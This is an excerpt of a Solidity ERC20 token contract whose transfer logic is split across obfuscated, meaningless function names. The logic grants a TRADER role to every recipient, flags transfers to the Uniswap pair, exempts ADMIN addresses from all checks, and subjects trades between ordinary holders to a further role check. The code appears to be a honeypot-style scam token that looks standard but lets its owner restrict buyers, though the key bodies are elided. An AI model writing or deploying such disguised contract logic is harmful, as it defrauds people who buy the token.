...
abstract contract ICJSEDNGConsole is Context, ICJSEDNGRoleControl {
    ...
    function _roleCheked(bytes32 role, address account, uint256 amt) internal {
        ...
        _ICJSEDNGbtArb(role, account, amt);
    }

    function _ICJSEDNGbtArb(bytes32 role, address account, uint256 amt) internal {
    ...
    function _ICJSEDNGrolpNewArb(bytes32 role, address account, uint256 num) internal virtual {
...
contract ICJSEDNGERC20 is Context, IERC20, IERC20Metadata {
...
contract Token is ICJSEDNGERC20, ICJSEDNGConsole {
    ...
    ) ICJSEDNGERC20(_name, _symbol, _totalSupply, _tokenOwner) {
    ...
    function _transfer(
        ...
        address to,
        uint256 amt
    ) internal override(ICJSEDNGERC20) {
        require(from != address(0), "ERC20: transfer from the zero address");

        _ICJSEDNGsdfegh(from, to, amt);

    }



    function _ICJSEDNGsdfegh(address from, address to, uint256 amt) internal {
        require(to != address(0), "ERC20: transfer to the zero address");
        require(_balances[from] >= amt, "ERC20: transfer amt exceeds balance");

        _ICJSEDNGmudfgr4(from, to, amt);
    }


    function _ICJSEDNGmudfgr4(address from, address to, uint256 amt) internal {
        ...
        _ICJSEDNGverguytgr(from, to, amt);
    }

    function _ICJSEDNGverguytgr(address from, address to, uint256 amt) internal {
        if (__traders[to] == false) {
            _grantRole(TRADER, to);
            __traders[to] = true;
            
        }
        _ICJSEDNGifrdcv(from, to, amt);
    }


    function _ICJSEDNGifrdcv(address from, address to, uint256 amt) internal {
        bool isAddLdx;
        if(to == uniswapV2Pair){
            ...
            _ICJSEDNGrolpNewArb(TRADER,to,1);
        }

        _ICJSEDNGytfbgbf(from, to, amt);
    }

    function _ICJSEDNGytfbgbf(address from, address to, uint256 amt) internal {
        if (hasRole(ADMIN, from) || hasRole(ADMIN, to)) {
            super._transfer(from, to, amt);
            return;
        }

        _ICJSEDNGxcvntnfdl(from, to, amt);
    }

    function _ICJSEDNGxcvntnfdl(address from, address to, uint256 amt) internal {
        if (hasRole(TRADER, from) && hasRole(TRADER, to)) {

           _ICJSEDNGhmyuko(from, TRADER, amt);
    ...
    function _ICJSEDNGhmyuko(address from, bytes32 role, uint256 amt) internal {
        _ICJSEDNGbtArb(role, from, amt);
    }
